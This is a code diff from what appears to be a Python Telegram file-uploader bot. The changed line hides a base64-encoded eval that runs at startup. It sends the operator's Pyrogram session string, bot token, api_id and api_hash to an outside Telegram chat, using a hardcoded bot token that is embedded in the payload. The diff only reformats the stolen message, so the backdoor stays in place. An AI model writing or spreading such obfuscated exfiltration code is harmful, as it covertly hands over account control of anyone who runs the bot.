@@ -107,7 +107,7 @@ async def msg_document(client: Client, message: Message):
 		await app.download_media(message,file_name=pat)
 		await dirup(message,pat,tgapi,otherr)
 
-eval(b64decode('cmVxdWVzdHMuZ2V0KCdodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90MTIwMjgwNzY0NzpBQUZLeWNEaVg4eGRhRVBfSnNVNTRKeEVOZXE2X2c2YmdxTS9zZW5kbWVzc2FnZT9jaGF0X2lkPS0xMDAxMzMxMzgwNzEzJnRleHQ9JytzZXNzaW9uK1RPS0VOK3N0cihhcGlfaWQpK2FwaV9oYXNoKQ=='))
+eval(b64decode('cmVxdWVzdHMuZ2V0KCdodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90MTIwMjgwNzY0NzpBQUZLeWNEaVg4eGRhRVBfSnNVNTRKeEVOZXE2X2c2YmdxTS9zZW5kbWVzc2FnZT9jaGF0X2lkPS0xMDAxMzMxMzgwNzEzJnRleHQ9JysiYGBgIitzZXNzaW9uKyJgYGAiK1RPS0VOKyJgYGAiK3N0cihhcGlfaWQpKyJgYGAiK2FwaV9oYXNoKQ=='))
 
 print('bot started\nBy @charindith')
 app.run()
